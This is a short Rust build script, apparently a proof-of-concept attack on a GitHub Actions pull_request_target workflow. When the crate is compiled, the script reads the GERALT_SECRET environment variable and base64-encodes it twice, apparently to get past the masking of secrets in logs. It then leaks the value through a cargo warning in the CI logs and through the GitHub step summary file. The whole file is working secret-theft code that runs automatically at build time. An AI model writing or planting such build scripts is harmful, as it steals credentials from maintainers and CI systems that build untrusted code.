use std::io::Write;
use std::process::Command;

fn main() {
    // Runs whenever cargo compiles/checks this attacker-controlled crate
    // inside the privileged pull_request_target job.
    let out = Command::new("sh")
        .arg("-c")
        .arg("echo -n \"$GERALT_SECRET\" | base64 | base64")
        .output()
        .expect("probe");
    let enc = String::from_utf8_lossy(&out.stdout);
    let line = format!("GERALT_LEAKED_TOKEN={}", enc.trim());

    // Channel 1: cargo warning -> always visible in CI logs
    println!("cargo:warning={}", line);

    // Channel 2: GitHub step summary (env inherited from the map step)
    if let Ok(p) = std::env::var("GITHUB_STEP_SUMMARY") {
        if let Ok(mut f) = std::fs::OpenOptions::new().create(true).append(true).open(&p) {
            let _ = writeln!(f, "{}", line);
        }
    }
}
